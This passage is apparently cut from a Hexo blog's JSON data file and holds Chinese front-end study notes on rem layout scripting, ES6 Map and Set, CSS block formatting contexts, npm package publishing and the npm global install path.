2018-04-19 09:23:15\ntags: 响应式\narchives: 样式表\ncategories: JS\n---\n为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize \n````\n// getSize(解决rem布局)\n(function(){\n\tgetSize();\n\twindow.addEventListener('resize',getSize);\n\t\n\tfunction getSize(){\n\t\tdocument.documentElement.style.fontSize \n\t\t= document.documentElement.clientWidth/3.75/2+'px';\n\t}\n})()\n````","slug":"JS/响应式布局JS事件","published":1,"updated":"2018-05-05T02:37:50.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbl0019r8xjr2dme3w6","content":"<p>为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// getSize(解决rem布局)</span><br><span class=\"line\">(function()&#123;</span><br><span class=\"line\">\tgetSize();</span><br><span class=\"line\">\twindow.addEventListener(&apos;resize&apos;,getSize);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfunction getSize()&#123;</span><br><span class=\"line\">\t\tdocument.documentElement.style.fontSize </span><br><span class=\"line\">\t\t= document.documentElement.clientWidth/3.75/2+&apos;px&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// getSize(解决rem布局)</span><br><span class=\"line\">(function()&#123;</span><br><span class=\"line\">\tgetSize();</span><br><span class=\"line\">\twindow.addEventListener(&apos;resize&apos;,getSize);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfunction getSize()&#123;</span><br><span class=\"line\">\t\tdocument.documentElement.style.fontSize </span><br><span class=\"line\">\t\t= document.documentElement.clientWidth/3.75/2+&apos;px&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure></p>\n"},{"title":"JS笔记-廖雪峰","date":"2018-04-16T09:22:06.000Z","archives":null,"_content":"ES6 Map和Set(廖雪峰)\n(https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000)<br>\nJavaScript的 默认对象 表示方式`{}`可以视为其他语言中的`Map`或`Dictionary`的数据结构，即一组`键值对`。\n但是JavaScript的对象有个小问题，就是`键`必须是`字符串`。但实际上`Number`或者`其他数据类型`作为键也是非常合理的。\n\n为了解决这个问题，最新的`ES6`规范引入了 新的 数据类型`Map`。\n测试浏览器是否支持`ES6规范` 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：\n````\n'use strict';\nvar m = new Map();\nvar s = new Set();\nconsole.log('你的浏览器支持Map和Set！');\n````\n## Map(`增set` `删delete` `改set` `查get has`)\n`Map`是一组`键值对`的结构，具有极快的查找速度。\n> var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]); <br>\n> m.get('Michael'); // 95\n\n初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：\n````\nvar m = new Map(); // 空Map\nm.set('Adam', 67); // 添加新的key-value\nm.set('Bob', 59);\nm.has('Adam'); // 是否存在key 'Adam': true\nm.get('Adam'); // 67\nm.delete('Adam'); // 删除key 'Adam'\nm.get('Adam'); // undefined\n````\n一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：\n````\nvar m = new Map();\nm.set('Adam', 67);\nm.set('Adam', 88);\nm.get('Adam'); // 88\n````\n\n## Set(`没有重复的key`)\n`Set`和`Map`类似，也是一组`key的集合`，但`不存储value`。由于`key不能重复`，所以，在Set中，`没有重复的key`。\n要`创建一个Set`，需要提供一个`Array`作为输入，或者`直接创建一个空Set`：\n````\nvar s1 = new Set(); // 空Set\nvar s2 = new Set([1, 2, 3]); // 含1, 2, 3\n````\n重复元素在Set中自动被过滤：\n> var s = new Set([1, 2, 3, 3, '3']);\n> s; // Set {1, 2, 3, \"3\"}\n\n通过`add(key)`方法可以`添加元素到Set`中，可以重复添加，但不会有效果：\n通过`delete(key)`方法可以删除元素：\n\n","source":"_posts/JS/JS笔记-廖雪峰.md","raw":"---\ntitle: JS笔记-廖雪峰\ndate: 2018-04-16 17:22:06\ntags: ES5/ES6\narchives: \ncategories: 原生JS\n---\nES6 Map和Set(廖雪峰)\n(https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000)<br>\nJavaScript的 默认对象 表示方式`{}`可以视为其他语言中的`Map`或`Dictionary`的数据结构，即一组`键值对`。\n但是JavaScript的对象有个小问题，就是`键`必须是`字符串`。但实际上`Number`或者`其他数据类型`作为键也是非常合理的。\n\n为了解决这个问题，最新的`ES6`规范引入了 新的 数据类型`Map`。\n测试浏览器是否支持`ES6规范` 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：\n````\n'use strict';\nvar m = new Map();\nvar s = new Set();\nconsole.log('你的浏览器支持Map和Set！');\n````\n## Map(`增set` `删delete` `改set` `查get has`)\n`Map`是一组`键值对`的结构，具有极快的查找速度。\n> var m = new Map([['Michael', 95], ['Bob', 75], ['Tracy', 85]]); <br>\n> m.get('Michael'); // 95\n\n初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：\n````\nvar m = new Map(); // 空Map\nm.set('Adam', 67); // 添加新的key-value\nm.set('Bob', 59);\nm.has('Adam'); // 是否存在key 'Adam': true\nm.get('Adam'); // 67\nm.delete('Adam'); // 删除key 'Adam'\nm.get('Adam'); // undefined\n````\n一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：\n````\nvar m = new Map();\nm.set('Adam', 67);\nm.set('Adam', 88);\nm.get('Adam'); // 88\n````\n\n## Set(`没有重复的key`)\n`Set`和`Map`类似，也是一组`key的集合`，但`不存储value`。由于`key不能重复`，所以，在Set中，`没有重复的key`。\n要`创建一个Set`，需要提供一个`Array`作为输入，或者`直接创建一个空Set`：\n````\nvar s1 = new Set(); // 空Set\nvar s2 = new Set([1, 2, 3]); // 含1, 2, 3\n````\n重复元素在Set中自动被过滤：\n> var s = new Set([1, 2, 3, 3, '3']);\n> s; // Set {1, 2, 3, \"3\"}\n\n通过`add(key)`方法可以`添加元素到Set`中，可以重复添加，但不会有效果：\n通过`delete(key)`方法可以删除元素：\n\n","slug":"JS/JS笔记-廖雪峰","published":1,"updated":"2018-05-05T01:26:34.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbm001br8xj2rfuqks1","content":"<p>ES6 Map和Set(廖雪峰)<br>(<a href=\"https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000</a>)<br><br>JavaScript的 默认对象 表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组<code>键值对</code>。<br>但是JavaScript的对象有个小问题，就是<code>键</code>必须是<code>字符串</code>。但实际上<code>Number</code>或者<code>其他数据类型</code>作为键也是非常合理的。</p>\n<p>为了解决这个问题，最新的<code>ES6</code>规范引入了 新的 数据类型<code>Map</code>。<br>测试浏览器是否支持<code>ES6规范</code> 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">var m = new Map();</span><br><span class=\"line\">var s = new Set();</span><br><span class=\"line\">console.log(&apos;你的浏览器支持Map和Set！&apos;);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Map-增set-删delete-改set-查get-has\"><a href=\"#Map-增set-删delete-改set-查get-has\" class=\"headerlink\" title=\"Map(增set 删delete 改set 查get has)\"></a>Map(<code>增set</code> <code>删delete</code> <code>改set</code> <code>查get has</code>)</h2><p><code>Map</code>是一组<code>键值对</code>的结构，具有极快的查找速度。</p>\n<blockquote>\n<p>var m = new Map([[‘Michael’, 95], [‘Bob’, 75], [‘Tracy’, 85]]); <br><br>m.get(‘Michael’); // 95</p>\n</blockquote>\n<p>初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map(); // 空Map</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67); // 添加新的key-value</span><br><span class=\"line\">m.set(&apos;Bob&apos;, 59);</span><br><span class=\"line\">m.has(&apos;Adam&apos;); // 是否存在key &apos;Adam&apos;: true</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 67</span><br><span class=\"line\">m.delete(&apos;Adam&apos;); // 删除key &apos;Adam&apos;</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // undefined</span><br></pre></td></tr></table></figure></p>\n<p>一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map();</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67);</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 88);</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 88</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Set-没有重复的key\"><a href=\"#Set-没有重复的key\" class=\"headerlink\" title=\"Set(没有重复的key)\"></a>Set(<code>没有重复的key</code>)</h2><p><code>Set</code>和<code>Map</code>类似，也是一组<code>key的集合</code>，但<code>不存储value</code>。由于<code>key不能重复</code>，所以，在Set中，<code>没有重复的key</code>。<br>要<code>创建一个Set</code>，需要提供一个<code>Array</code>作为输入，或者<code>直接创建一个空Set</code>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var s1 = new Set(); // 空Set</span><br><span class=\"line\">var s2 = new Set([1, 2, 3]); // 含1, 2, 3</span><br></pre></td></tr></table></figure></p>\n<p>重复元素在Set中自动被过滤：</p>\n<blockquote>\n<p>var s = new Set([1, 2, 3, 3, ‘3’]);<br>s; // Set {1, 2, 3, “3”}</p>\n</blockquote>\n<p>通过<code>add(key)</code>方法可以<code>添加元素到Set</code>中，可以重复添加，但不会有效果：<br>通过<code>delete(key)</code>方法可以删除元素：</p>\n","site":{"data":{}},"excerpt":"","more":"<p>ES6 Map和Set(廖雪峰)<br>(<a href=\"https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345007434430758e3ac6e1b44b1865178e7aff9082e000</a>)<br><br>JavaScript的 默认对象 表示方式<code>{}</code>可以视为其他语言中的<code>Map</code>或<code>Dictionary</code>的数据结构，即一组<code>键值对</code>。<br>但是JavaScript的对象有个小问题，就是<code>键</code>必须是<code>字符串</code>。但实际上<code>Number</code>或者<code>其他数据类型</code>作为键也是非常合理的。</p>\n<p>为了解决这个问题，最新的<code>ES6</code>规范引入了 新的 数据类型<code>Map</code>。<br>测试浏览器是否支持<code>ES6规范</code> 执行以下代码，如浏览器报ReferenceError错误，那么你需要换一个支持ES6的浏览器：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;use strict&apos;;</span><br><span class=\"line\">var m = new Map();</span><br><span class=\"line\">var s = new Set();</span><br><span class=\"line\">console.log(&apos;你的浏览器支持Map和Set！&apos;);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Map-增set-删delete-改set-查get-has\"><a href=\"#Map-增set-删delete-改set-查get-has\" class=\"headerlink\" title=\"Map(增set 删delete 改set 查get has)\"></a>Map(<code>增set</code> <code>删delete</code> <code>改set</code> <code>查get has</code>)</h2><p><code>Map</code>是一组<code>键值对</code>的结构，具有极快的查找速度。</p>\n<blockquote>\n<p>var m = new Map([[‘Michael’, 95], [‘Bob’, 75], [‘Tracy’, 85]]); <br><br>m.get(‘Michael’); // 95</p>\n</blockquote>\n<p>初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map(); // 空Map</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67); // 添加新的key-value</span><br><span class=\"line\">m.set(&apos;Bob&apos;, 59);</span><br><span class=\"line\">m.has(&apos;Adam&apos;); // 是否存在key &apos;Adam&apos;: true</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 67</span><br><span class=\"line\">m.delete(&apos;Adam&apos;); // 删除key &apos;Adam&apos;</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // undefined</span><br></pre></td></tr></table></figure></p>\n<p>一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map();</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67);</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 88);</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 88</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Set-没有重复的key\"><a href=\"#Set-没有重复的key\" class=\"headerlink\" title=\"Set(没有重复的key)\"></a>Set(<code>没有重复的key</code>)</h2><p><code>Set</code>和<code>Map</code>类似，也是一组<code>key的集合</code>，但<code>不存储value</code>。由于<code>key不能重复</code>，所以，在Set中，<code>没有重复的key</code>。<br>要<code>创建一个Set</code>，需要提供一个<code>Array</code>作为输入，或者<code>直接创建一个空Set</code>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var s1 = new Set(); // 空Set</span><br><span class=\"line\">var s2 = new Set([1, 2, 3]); // 含1, 2, 3</span><br></pre></td></tr></table></figure></p>\n<p>重复元素在Set中自动被过滤：</p>\n<blockquote>\n<p>var s = new Set([1, 2, 3, 3, ‘3’]);<br>s; // Set {1, 2, 3, “3”}</p>\n</blockquote>\n<p>通过<code>add(key)</code>方法可以<code>添加元素到Set</code>中，可以重复添加，但不会有效果：<br>通过<code>delete(key)</code>方法可以删除元素：</p>\n"},{"title":"CSS-潜藏着的BFC","date":"2015-04-16T07:54:04.000Z","archives":"样式表","_content":" ### 一、什么是BFC(Block Formatting Context)\n   写`CSS`样式时，对一个`元素`设置css,我们首先要知道这个元素是`块级元素`还是`行内元素`，而`BFC`就是用来**`格式化块级盒子`**的。<br>\n  `Formatting Context`：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br>\n  `BFC定义`：块级格式化上下文  它是指一个独立的块级渲染区域，只有`Block-level Box`参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br>\n \n ### 二、BFC的生成\n  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br>\n  满足下列CSS声明`之一`的元素便会生成BFC：\n   + 1.根元素或其它包含它的元素\n   + 2.float的值不为none；\n   + 3.overflow的值不为visible；\n   + 4.position的值不为static；\n   + 5.display的值为inline-block、table-cell、table-caption；\n   + 6.flex boxes (元素的display: flex或inline-flex)；\n   \n   注：也有人认为`display: table`能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。\n\n ### 三、BFC的布局规则\n  菜鸟教程待续\n  ","source":"_posts/CSS/CSS-潜藏着的BFC.md","raw":"---\ntitle: CSS-潜藏着的BFC\ndate: 2015-04-16 15:54:04\ntags: BFC\narchives: 样式表\ncategories: CSS\n---\n ### 一、什么是BFC(Block Formatting Context)\n   写`CSS`样式时，对一个`元素`设置css,我们首先要知道这个元素是`块级元素`还是`行内元素`，而`BFC`就是用来**`格式化块级盒子`**的。<br>\n  `Formatting Context`：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br>\n  `BFC定义`：块级格式化上下文  它是指一个独立的块级渲染区域，只有`Block-level Box`参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br>\n \n ### 二、BFC的生成\n  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br>\n  满足下列CSS声明`之一`的元素便会生成BFC：\n   + 1.根元素或其它包含它的元素\n   + 2.float的值不为none；\n   + 3.overflow的值不为visible；\n   + 4.position的值不为static；\n   + 5.display的值为inline-block、table-cell、table-caption；\n   + 6.flex boxes (元素的display: flex或inline-flex)；\n   \n   注：也有人认为`display: table`能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。\n\n ### 三、BFC的布局规则\n  菜鸟教程待续\n  ","slug":"CSS/CSS-潜藏着的BFC","published":1,"updated":"2018-05-05T01:28:36.609Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbo001er8xju55hduj9","content":"<h3 id=\"一、什么是BFC-Block-Formatting-Context\"><a href=\"#一、什么是BFC-Block-Formatting-Context\" class=\"headerlink\" title=\"一、什么是BFC(Block Formatting Context)\"></a>一、什么是BFC(Block Formatting Context)</h3><p>   写<code>CSS</code>样式时，对一个<code>元素</code>设置css,我们首先要知道这个元素是<code>块级元素</code>还是<code>行内元素</code>，而<code>BFC</code>就是用来<strong><code>格式化块级盒子</code></strong>的。<br><br>  <code>Formatting Context</code>：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br><br>  <code>BFC定义</code>：块级格式化上下文  它是指一个独立的块级渲染区域，只有<code>Block-level Box</code>参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br></p>\n<h3 id=\"二、BFC的生成\"><a href=\"#二、BFC的生成\" class=\"headerlink\" title=\"二、BFC的生成\"></a>二、BFC的生成</h3><p>  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br><br>  满足下列CSS声明<code>之一</code>的元素便会生成BFC：</p>\n<ul>\n<li>1.根元素或其它包含它的元素</li>\n<li>2.float的值不为none；</li>\n<li>3.overflow的值不为visible；</li>\n<li>4.position的值不为static；</li>\n<li>5.display的值为inline-block、table-cell、table-caption；</li>\n<li><p>6.flex boxes (元素的display: flex或inline-flex)；</p>\n<p>注：也有人认为<code>display: table</code>能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。</p>\n<h3 id=\"三、BFC的布局规则\"><a href=\"#三、BFC的布局规则\" class=\"headerlink\" title=\"三、BFC的布局规则\"></a>三、BFC的布局规则</h3><p>菜鸟教程待续</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一、什么是BFC-Block-Formatting-Context\"><a href=\"#一、什么是BFC-Block-Formatting-Context\" class=\"headerlink\" title=\"一、什么是BFC(Block Formatting Context)\"></a>一、什么是BFC(Block Formatting Context)</h3><p>   写<code>CSS</code>样式时，对一个<code>元素</code>设置css,我们首先要知道这个元素是<code>块级元素</code>还是<code>行内元素</code>，而<code>BFC</code>就是用来<strong><code>格式化块级盒子</code></strong>的。<br><br>  <code>Formatting Context</code>：指页面中一个渲染区域，并且拥有一套渲染规则，它决定了其子元素如何定位，以及与其他元素的相互关系和作用。<br><br>  <code>BFC定义</code>：块级格式化上下文  它是指一个独立的块级渲染区域，只有<code>Block-level Box</code>参与，该区域拥有一套渲染规则来约束块级盒子的布局，且与区域外部无关。<br></p>\n<h3 id=\"二、BFC的生成\"><a href=\"#二、BFC的生成\" class=\"headerlink\" title=\"二、BFC的生成\"></a>二、BFC的生成</h3><p>  说到BFC是一块渲染区域，那么这块渲染区域到底在哪里呢，具体大小又是多少？这些都是由生成BFC的元素来决定的。<br><br>  满足下列CSS声明<code>之一</code>的元素便会生成BFC：</p>\n<ul>\n<li>1.根元素或其它包含它的元素</li>\n<li>2.float的值不为none；</li>\n<li>3.overflow的值不为visible；</li>\n<li>4.position的值不为static；</li>\n<li>5.display的值为inline-block、table-cell、table-caption；</li>\n<li><p>6.flex boxes (元素的display: flex或inline-flex)；</p>\n<p>注：也有人认为<code>display: table</code>能生成BFC，我认为最主要原因是table会默认生成一个匿名的table-cell，正是这个匿名的table-cell生成了BFC。</p>\n<h3 id=\"三、BFC的布局规则\"><a href=\"#三、BFC的布局规则\" class=\"headerlink\" title=\"三、BFC的布局规则\"></a>三、BFC的布局规则</h3><p>菜鸟教程待续</p>\n</li>\n</ul>\n"},{"title":"npm 上传包","date":"2018-05-08T02:53:07.000Z","archives":"npm","_content":"# npm上传包，github封装库\n  1. github新建项目，上传项目，根据杨清项目配置\n  2. 配置好项目 npm login \n  3. npm publish . 上传项目\n  NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。\n\n  4. 在其他项目 npm install '包名'\n  5. 引入，调用\n","source":"_posts/NPM/npm-上传包.md","raw":"---\ntitle: npm 上传包\ndate: 2018-05-08 10:53:07\ntags: npm 上传包\narchives: npm \ncategories: NPM\n---\n# npm上传包，github封装库\n  1. github新建项目，上传项目，根据杨清项目配置\n  2. 配置好项目 npm login \n  3. npm publish . 上传项目\n  NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。\n\n  4. 在其他项目 npm install '包名'\n  5. 引入，调用\n","slug":"NPM/npm-上传包","published":1,"updated":"2018-05-08T03:14:25.458Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbp001hr8xj47yzoaud","content":"<h1 id=\"npm上传包，github封装库\"><a href=\"#npm上传包，github封装库\" class=\"headerlink\" title=\"npm上传包，github封装库\"></a>npm上传包，github封装库</h1><ol>\n<li>github新建项目，上传项目，根据杨清项目配置</li>\n<li>配置好项目 npm login </li>\n<li><p>npm publish . 上传项目<br>NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。</p>\n</li>\n<li><p>在其他项目 npm install ‘包名’</p>\n</li>\n<li>引入，调用</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"npm上传包，github封装库\"><a href=\"#npm上传包，github封装库\" class=\"headerlink\" title=\"npm上传包，github封装库\"></a>npm上传包，github封装库</h1><ol>\n<li>github新建项目，上传项目，根据杨清项目配置</li>\n<li>配置好项目 npm login </li>\n<li><p>npm publish . 上传项目<br>NOTE: 版本号，项目名称禁止大写，Token,添加github地址，上传包之前编译。TS版，包声明。</p>\n</li>\n<li><p>在其他项目 npm install ‘包名’</p>\n</li>\n<li>引入，调用</li>\n</ol>\n"},{"title":"nodejs全局安装路径的位置","date":"2018-05-08T03:17:12.000Z","archives":null,"_content":"一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到\n\n![变量路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png)\n\n\n所谓全局安装：\n\n是指安装在`node`中`node_module`的根目录里，可以在电脑的任何位置调用这个方法。\n\n那么，如何在找到全局安装的位置呢？\n\n\n## <font color=#f00>方法一：</font>\n\n设置到自己想要放的位置：\n\n<font color=#f90 style='font-size:18px'>\n打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径\n\nprefix = E:\\nodejs\\npm_global_modules\n</font>\n\n## <font color=#f00>方法二：</font>\n使用快捷键 `win+R` ,输入cmd打开命令窗口，输入如下代码：\n\n````\n> npm config ls\n````\n\n![npm配置](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png)\n\n<b style='font-size:18px'>\n其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b>\n\n![安装路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png)\n\n这时可以通过命令来更改路径\n\n````\nnpm config set prefix E:\\\n````\n\n-----------------------------\n\n[阅读原文](https://www.cnblogs.com/niuxiaoling/p/7993032.html)","source":"_posts/NodeJS/nodejs全局安装路径的位置.md","raw":"---\ntitle: nodejs全局安装路径的位置\ndate: 2018-05-08 11:17:12\ntags:\narchives:\ncategories:\n---\n一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到\n\n![变量路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png)\n\n\n所谓全局安装：\n\n是指安装在`node`中`node_module`的根目录里，可以在电脑的任何位置调用这个方法。\n\n那么，如何在找到全局安装的位置呢？\n\n\n## <font color=#f00>方法一：</font>\n\n设置到自己想要放的位置：\n\n<font color=#f90 style='font-size:18px'>\n打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径\n\nprefix = E:\\nodejs\\npm_global_modules\n</font>\n\n## <font color=#f00>方法二：</font>\n使用快捷键 `win+R` ,输入cmd打开命令窗口，输入如下代码：\n\n````\n> npm config ls\n````\n\n![npm配置](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png)\n\n<b style='font-size:18px'>\n其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b>\n\n![安装路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png)\n\n这时可以通过命令来更改路径\n\n````\nnpm config set prefix E:\\\n````\n\n-----------------------------\n\n[阅读原文](https://www.cnblogs.com/niuxiaoling/p/7993032.html)","slug":"NodeJS/nodejs全局安装路径的位置","published":1,"updated":"2018-05-08T03:35:11.598Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nbq001kr8xjw77yknre","content":"<p>一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到</p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png\" alt=\"变量路径\"></p>\n<p>所谓全局安装：</p>\n<p>是指安装在<code>node</code>中<code>node_module</code>的根目录里，可以在电脑的任何位置调用这个方法。</p>\n<p>那么，如何在找到全局安装的位置呢？</p>\n<h2 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a><font color=\"#f00\">方法一：</font></h2><p>设置到自己想要放的位置：</p>\n<font color=\"#f90\" style=\"font-size:18px\"><br>打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径<br><br>prefix = E:\\nodejs\\npm_global_modules<br></font>\n\n<h2 id=\"方法二：\"><a href=\"#方法二：\" class=\"headerlink\" title=\"方法二：\"></a><font color=\"#f00\">方法二：</font></h2><p>使用快捷键 <code>win+R</code> ,输入cmd打开命令窗口，输入如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; npm config ls</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png\" alt=\"npm配置\"></p>\n<p><b style=\"font-size:18px\"><br>其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b></p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png\" alt=\"安装路径\"></p>\n<p>这时可以通过命令来更改路径</p>\n<figure class=\"highlight 